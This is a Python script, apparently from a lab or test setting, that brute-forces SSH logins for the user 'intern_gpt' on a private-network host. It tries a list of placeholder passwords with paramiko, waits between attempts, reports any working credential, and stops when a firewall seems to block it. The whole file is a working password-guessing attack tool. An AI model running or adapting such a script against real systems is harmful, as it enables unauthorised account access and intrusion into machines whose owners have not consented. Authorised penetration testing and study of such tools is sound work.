import paramiko
import time

target_ip = "192.168.19.80"
username = "intern_gpt"
passwords = ["pass1", "pass2", "pass3", "pass4", "pass5","pass6", "pass7", "pass8", "pass9", "pass10"]

DELAY_BETWEEN_ATTEMPTS = 3  # Small delay

for i, password in enumerate(passwords, 1):
    print(f"\n[Attempt {i}/{len(passwords)}] Trying password: {password}")
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        client.connect(
            target_ip, 
            username=username, 
            password=password, 
            timeout=10,
            banner_timeout=15
        )
        
        print(f"SUCCESS! Valid credentials: {username}:{password}")
        client.close()
        exit(0)
        
    except paramiko.AuthenticationException:
        print(f"Invalid credentials")
        
    except Exception as e:
        print(f"Connection error: {type(e).__name__} - {str(e)}")
        if "timed out" in str(e).lower() or "refused" in str(e).lower():
            print("\nIP likely blocked by firewall!")
            break
    
    # Wait between passwords
    if i < len(passwords):
        time.sleep(DELAY_BETWEEN_ATTEMPTS)

print("\nTest completed.")